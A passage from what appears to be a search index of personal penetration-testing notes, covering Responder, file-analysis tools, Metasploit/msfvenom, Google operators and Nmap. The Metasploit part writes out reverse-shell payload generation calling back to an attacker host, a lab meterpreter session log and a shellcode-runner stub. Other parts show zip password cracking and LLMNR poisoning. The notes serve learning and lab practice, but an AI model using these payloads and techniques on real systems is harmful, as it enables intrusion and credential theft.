Mayhem PowerSploit.psm1 Recon CodeExecution Persistence Privesc ScriptModification Exfiltration PowerSploit.psd1 README.md Tests Others Responder\/MultiRelay GitHub - lgandx Responder an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http:\/\/support.microsoft.com\/kb\/163409). responder -I tun0 Get Full hashes in Responder locate Responder.db sqlite3 \/usr\/share\/responder\/Responder.db sqlite&gt; select * from responder;","tags":"","url":"Misc_Tools\/Misc_Pentesting_Tools.html"},{"title":"File Analyze Tools","text":"File Analyze Tools Table of Contents File Analyze Tools tags: Security Tools Reference Tools General xxd binwalk Compressed File pkcrack image stegsolve exiftool Microsoft oletools Tools to analyze malicious documents Tools to analyze the structure of OLE files virtual machine vhd (Virtual Hard Disk) zip file pkcrack fcrackzip tags: Security Tools Reference GitHub - zardus Tools General xxd 0000000: 2e54 4820 5858 4420 3120 224d .TH XXD 1 &quot;M 000000c: 616e 7561 6c20 7061 6765 2066 anual page f 0000018: 6f72 2078 7864 220a 2e5c 220a or xxd&quot;..\\&quot;. 0000024: 2e5c 2220 3231 7374 204d 6179 .\\&quot; 21st May 0000030: 2031 3939 360a 2e5c 2220 4d61 1996..\\&quot; Ma 000003c: 6e20 7061 6765 2061 7574 686f n page autho 0000048: 723a 0a2e 5c22 2020 2020 546f r:..\\&quot; To 0000054: 6e79 204e 7567 656e 7420 3c74 ny Nugent &lt;t 0000060: 6f6e 7940 7363 746e 7567 656e ony@sctnugen 000006c: 2e70 7070 2e67 752e 6564 752e .ppp.gu.edu. binwalk \u5f9ebinary\u5206\u6790\u6a94\u6848(png + rar\u7b49\u7b49) Compressed File pkcrack \u5df2\u77e5\u660e\u6587zip\u653b\u64ca image stegsolve \u5716\u7247\u5404\u7a2e\u72c0\u614b wget http:\/\/www.caesum.com\/handbook\/Stegsolve.jar -O stegsolve.jar chmod +x stegsolve.jar apt-get install openjdk-8-jre java -jar stegsolve.jar java -version \/\/openjdk version &quot;1.8.0_131&quot; \/\/OpenJDK Runtime Environment (build 1.8.0_131-8u131-b11-0ubuntu1.16.04.2-b11) \/\/OpenJDK 64-Bit Server VM (build 25.131-b11, mixed mode) exiftool apt-get install libimage-exiftool-perl exiftool example.png Microsoft oletools GitHub python3 -m pip install oletools Tools to analyze malicious documents oleid: to analyze OLE files to detect specific characteristics usually found in malicious files. olevba: to extract and analyze VBA Macro source code from MS Office documents (OLE and OpenXML). MacroRaptor: to detect malicious VBA Macros msodde: to detect and extract DDE\/DDEAUTO links from MS Office documents, RTF and CSV pyxswf: to detect, extract and analyze Flash objects (SWF) that may be embedded in files such as MS Office documents (e.g. Word, Excel) and RTF, which is especially useful for malware analysis. oleobj: to extract embedded objects from OLE files. rtfobj: to extract embedded objects from RTF files. Tools to analyze the structure of OLE files olebrowse: A simple GUI to browse OLE files (e.g. MS Word, Excel, Powerpoint documents), to view and extract individual data streams. olemeta: to extract all standard properties (metadata) from OLE files. oletimes: to extract creation and modification timestamps of all streams and storages. oledir: to display all the directory entries of an OLE file, including free and orphaned entries. olemap: to display a map of all the sectors in an OLE file. virtual machine vhd (Virtual Hard Disk) 7z 7z l .\/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd guestmount apt install libguestfs-tools guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v \/mnt\/vhd zip file pkcrack fcrackzip fcrackzip -D -p \/usr\/share\/wordlists\/rockyou.txt backup.zip","tags":"","url":"Misc_Tools\/File_Analyze_Tools.html"},{"title":"Vulnerable Target Machine","text":"Vulnerable Target Machine Table of Contents Vulnerable Target Machine tags: Security Metasploitable 2 WebGoat bWAPP\/bee-box Capture The Flag Crypto tags: Security Metasploitable 2 include Mutillidae, DVWA WebGoat bWAPP\/bee-box Capture The Flag CTF Training Docker Crypto cryptopals.com","tags":"","url":"Misc_Tools\/Vulnerable_Target_Machine.html"},{"title":"Tools-Metasploit","text":"Metasploit Table of Contents Metasploit tags: Security Tools Reference Msfconsole modules Auxiliary Exploits MSFVenom cheatsheet overview EXITFUNC Useful Payload Payload staged\/non-staged example: using staged payload test payload Meterpreter Online Resources Commands execute tags: Security Tools Reference Using exploits Msfconsole msf&gt; search snmp msf&gt; use exploit\/...\/...\/... msf&gt; info msf&gt; show options msf&gt; set RHOST 192.168... msf&gt; set LHOST 192.168... msf&gt; set LPORT ... msf&gt; set PAYLOAD windows\/... msf&gt; exploit set global parameter msf&gt; setg RHOSTS 192.168... database services msf&gt; hosts msf&gt; db_nmap 192.168.31.200-254 --top-ports 20 msf&gt; services -p 443 # print all machine open 443 port modules Auxiliary msf &gt; show auxiliary Exploits MSFVenom cheatsheet msfvenom --list payloads | grep linux | grep x64 \/\/ search payloads msfvenom -p linux\/x64\/exec --list-options \/\/ list options \/\/ generate full interactive reverse shell msfvenom -p linux\/x64\/meterpreter\/reverse_tcp LHOST=10.10.14.12 LPORT=7702 -f elf -o msf.bin overview msfvenom -p windows\/shell_reverse_tcp \\ LHOST=192.168.30.5 \\ LPORT=443 \\ -f c \\ -a x86 \\ --platform windows \\ -b &quot;\\x00\\x0a\\x0d&quot; \\ -e x86\/shikata_ga_nai \\ EXITFUNC=thread \u6ce8\u610f\u9019\u500b\u751f\u6210\u7684 shellcode \u6703\u9700\u8981\u7528\u5230 stack \u81ea\u6211\u89e3\u58d3\u7e2e \uff0c\u5982\u679c shellcode \u653e\u5728 stack \u4e2d(ESP\u6307\u5411\u4f4d\u7f6e)\uff0c\u8981\u8a18\u5f97\u5728\u6700\u524d\u982d\u585e nop EXITFUNC thread: This method is used in most exploitation scenarios where the exploited process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application\/system (clean exit) process: This method should be used with multi\/handler. This method should also be used with any exploit where a master process restarts it on exit. seh: This method should be used when there is a structured exception handler (SEH) that will restart the thread or process automatically when an error occurs. shellcode note msfvenom command cheat sheet Useful Payload use windows\/meterpreter\/reverse_https use windows\/meterpreter\/reverse_tcp_allports Payload staged\/non-staged msfvenom -p &lt;payload&gt; -f &lt;format&gt; LHOST= LPORT= -e &lt;encoder&gt; -b &lt;bad-chars&gt; # -e x86\\shikata_ga_nai msfvenom \u2013list payload staged payload Metasploit exploit\/multi\/handler windows\/shell\/reverse_tcp non-staged payload nc -nvlp [port] windows\/shell_reverse_tcp (sent in its entirety in one go) windows\/shell\/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged) windows\/shell_reverse_tcp - Connect back to attacker and spawn a command shell example: using staged payload msf6 &gt; use exploit\/multi\/handler [*] Using configured payload generic\/shell_reverse_tcp msf6 exploit(multi\/handler) &gt; set lhost 10.10.14.12 lhost =&gt; 10.10.14.12 msf6 exploit(multi\/handler) &gt; set lport 7702 lport =&gt; 7702 msf6 exploit(multi\/handler) &gt; set payload linux\/x64\/meterpreter\/reverse_tcp payload =&gt; linux\/x64\/meterpreter\/reverse_tcp msf6 exploit(multi\/handler) &gt; run msfvenom -p linux\/x64\/meterpreter\/reverse_tcp LHOST=10.10.14.12 LPORT=7702 -f elf -o msf.bin \/\/ generate upload &amp; execute [*] Started reverse TCP handler on 10.10.14.12:7702 [*] Sending stage (3008420 bytes) to 10.10.10.61 [*] Meterpreter session 1 opened (10.10.14.12:7702 -&gt; 10.10.10.61:46986) at 2020-11-14 21:02:55 +0800 meterpreter &gt; ls test payload format \u9078 -f c #include &lt;stdio.h&gt; unsigned char buf[] = &quot;&quot; int main() { void (*f)() = (void (*)()) buf; f(); return 0; } \u7de8\u8b6f gcc -m32 -z execstack Meterpreter Online Resources METERPRETER BASIC COMMANDS Commands execute meterpreter &gt; execute -f bash -i -f &lt;opt&gt; The executable command to run. -i Interact with the process after creating it. -a &lt;opt&gt; The arguments to pass to the command. -c Channelized I\/O (required for interaction).","tags":"","url":"Misc_Tools\/Tools_Metasploit.html"},{"title":"Tools-Google Hacking","text":"Google Hacking Table of Contents Google Hacking tags: Security Tools Alternate query types \u5099\u4efd\u67e5\u8a62\u985e\u578b cache link related info Other define Query modifiers \u67e5\u8a62\u4fee\u98fe\u7b26 site intext intitle inurl Filetype Advanced operators tags: Security Tools Alternate query types \u5099\u4efd\u67e5\u8a62\u985e\u578b cache cache:www.csie.fju.edu.tw \u67e5\u8a62\u67d0\u7db2\u9801\u5728google\u4e2d\u7684cache link link:www.csie.fju.edu.tw \u67e5\u8a62\u6240\u6709\u548c\u7db2\u9801\u6709\u9023\u7d50\u7684\u7db2\u9801 related related:www.csie.fju.edu.tw \u5217\u51fa\u6240\u6709\u548c\u67e5\u8a62\u7db2\u9801\u985e\u4f3c\u7684\u7db2\u9801 info info:hoschoc.com \u5217\u51fa\u67d0\u7db2\u7ad9\u5728Google\u4e0a\u5b58\u6709\u54ea\u4e9b\u8cc7\u8a0a Other define define:\u8d6b\u863f \u5c0b\u627e\u67d0\u5b57\u8a5e\u5728\u7db2\u8def\u4e0a\u7684\u5b9a\u7fa9 Query modifiers \u67e5\u8a62\u4fee\u98fe\u7b26 site Usage:&quot;\u95dc\u9375\u5b57 site:\u7db2\u5740&quot; \u67e5\u8a62\u6307\u5b9a\u7db2\u7ad9\u5167\u7684\u7db2\u9801 site:tw \u4e5f\u53ef\u4ee5\u6307\u5b9a\u570b\u7c4d intext Intext:\u53f0\u7063 \u53ea\u60f3\u5728\u7db2\u9801\u5167\u6587\u4e2d\u5c0b\u627e\u8cc7\u6599 intitle \u53ea\u60f3\u5728\u7db2\u9801\u6a19\u984c\u4e2d\u5c0b\u627e\u8cc7\u6599 inurl \u5c0b\u627e\u6307\u5b9a\u7684\u5b57\u4e32\u5728\u7db2\u5740\u5217\u7576\u4e2d Filetype filetype:pdf filetype:mp3 Advanced operators Operator Purpose Mixes with Other Operators? Can be used Alone? Web Images Groups News intitle Search page Title yes yes yes yes yes yes allintitle Search page title no yes yes yes yes yes inurl Search URL yes yes yes yes not really like intitle allinurl Search URL no yes yes yes yes like intitle filetype specific files yes no yes yes no not really intext Search text of page only yes yes yes yes yes yes allintext Search text of page only not really yes yes yes yes yes site Search specific site yes yes yes yes no not really link Search for links to pages no yes yes no no not really inanchor Search link anchor text yes yes yes yes not really yes numrange Locate number yes yes yes no no not really daterange Search in date range yes no yes not really not really not really author Group author search yes yes no no yes not really group Group name search not really yes no no yes not really insubject Group subject search yes yes like intitle like intitle yes like intitle msgid Group msgid search no yes not really not really yes not really","tags":"","url":"Misc_Tools\/Tools_Google_Hacking.html"},{"title":"Tools-Nmap","text":"Nmap Table of Contents Nmap tags: Security Tools Cheet sheet Initial Scan Vulnerable Scan Others Parameters Output speed Guide Dealing with Misidentified and Unidentified Hosts Updater for Nmap\u2019s architecture-independent files tags: Security Tools Cheet sheet Initial Scan nmap -p- -vvv -oN nmap.scan_all_port.log {{target}} nmap -A -sC -sV -oN nmap.initial.log {{target}} cat nmap.scan_all_port.log | grep &quot;^[0-9]&quot; | awk -v FS=&quot;\/&quot; '{print $1}' | tr '\\n' ',' | sed s\/,$\/\/ ports=$(nmap -p- --min-rate=1000 -T4 {{target}} | grep &quot;^[0-9]&quot; | cut -d '\/' -f 1 | tr '\\n' ',' | sed s\/,$\/\/) nmap -sC -sV -p $ports {{target}} tip: sleep 300; Vulnerable Scan nmap --script &quot;vuln&quot; -oN nmap.vulnscan.log {{target}} nmap --script=&quot;smb-vuln*&quot; -p 139, 445 -v -oN nmap.vulnscan.smb.log {{target}} Others nmap -p- -sT {{target}} nmap -sT -sV -A -O -p 1-65535 {{target}} Parameters -A Enable OS detection (need sudo), version detection, script scanning, and traceroute Output -oA {{filename}} Output in the three major formats at once -oN {{filename}} Output scan in normal format speed -T paranoid(0)|sneaky(1)|polite(2)|normal(3)|aggressive(4)|insane(5) Set a timing template --min-rate {{number}} --max-rate {{number}} --min-rate 300 means that Nmap will try to keep the sending rate at or above 300 packets per second. -sn # Ping Scan - disable port scan -sT(TCP) | -sU(UDP) | -sY(SCTP INIT) | -sA(TCP ACK) -sN(Null) | -sF(FIN) | -sX(Xmas) --top-ports={{number}} # \u6383\u63cf\u524d {{number}} \u5e38\u7528\u7684 port -sV # enumerate versions -sC --script=default # run safe scripts -Pn # skip host discovery -p {{port}} {{ranges}} # -p 139,445 # -p 1-65535 == -p - # \u7bc4\u570d\u7684\u982d\u5c3e\u5982\u679c\u662f 1\/65535 \u53ef\u7701\u7565 # -p U:53,111,137,T:21-25,80 # T: for TCP, U: for UDP, S: for SCTP, or P: for IP Protocol --open # show only open ports -v | -vv | -vvv verbosity level Guide Dealing with Misidentified and Unidentified Hosts \u5982\u679c\u6c92\u8fa6\u6cd5\u6e96\u78ba\u7684\u5075\u6e2c OS\uff0c\u6709\u5e7e\u500b\u505a\u6cd5\uff1a \u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c \u6383\u63cf\u66f4\u591a port z.B. -p- \u6383\u63cf\u5168\u90e8\u7684 port \u6216 -sU \u52a0\u4e0a UDP Scan \u4f7f\u7528\u66f4\u7a4d\u6975\u7684\u731c\u6e2c \u6709\u4e9b\u6642\u5019\u6703\u56e0\u70ba\u9632\u706b\u7246\u4e4b\u985e\u7684\u554f\u984c\u5f97\u5230\u4e0d\u540c\u7684\u7d50\u679c \u52a0\u4e0a --osscan-guess \u53c3\u6578 \u63db\u500b\u5730\u65b9\u9032\u884c\u5075\u6e2c Updater for Nmap\u2019s architecture-independent files \u56e0\u70ba nselib \u548c nse scripts \u5e38\u5e38\u9700\u8981\u66f4\u65b0\uff0c\u6240\u4ee5\u6211\u73fe\u5728\u7684\u505a\u6cd5\u5c31\u662f\u76f4\u63a5 clone nmap \u7684 GitHub \u4e0b\u4f86\uff0clink nselib \u548c scripts \u5230 \/usr\/share\/nmap (\u628a\u539f\u672c\u7684 mv \u5230 *.old) \u53e6\u5916\u5728 manual \u6709\u770b\u5230\u4e00\u500b\u53eb\u505a nmap-update \u7684\u6771\u897f\u770b\u8d77\u4f86\u662f\u6211\u8981\u7684\uff0c\u4f46\u76ee\u524d (7.80) \u4f3c\u4e4e\u9084\u6c92\u6709\u9019\u500b\u529f\u80fd","tags":"","url":"Misc_Tools\/Tools_Nmap.html"}]});